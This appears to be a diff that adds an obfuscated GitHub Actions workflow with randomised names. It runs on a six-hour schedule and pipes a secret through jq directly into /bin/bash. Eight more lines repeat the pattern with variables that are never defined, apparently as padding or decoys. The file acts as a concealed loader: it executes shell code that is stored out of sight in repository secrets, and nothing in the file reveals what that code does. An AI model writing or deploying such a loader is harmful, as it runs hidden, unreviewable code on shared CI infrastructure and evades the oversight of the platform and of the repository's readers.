@@ -1,0 +1,25 @@
+name: gnawswanky
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gnawswanky
+        env:
+          von2575: ${{ secrets.von2575 }}
+        run: |
+          echo $von2575 | jq -r .ur8 | /bin/bash
+          echo $bcq2 | jq -r .pjtcy341 | /bin/bash
+          echo $xalya699 | jq -r .nhitp06 | /bin/bash
+          echo $mkjh8219 | jq -r .ag95648 | /bin/bash
+          echo $o326 | jq -r .phq1336 | /bin/bash
+          echo $h309 | jq -r .zx9 | /bin/bash
+          echo $cmak1 | jq -r .ovr71346 | /bin/bash
+          echo $bl5 | jq -r .m10 | /bin/bash
+          echo $hoz2 | jq -r .kx17 | /bin/bash
+
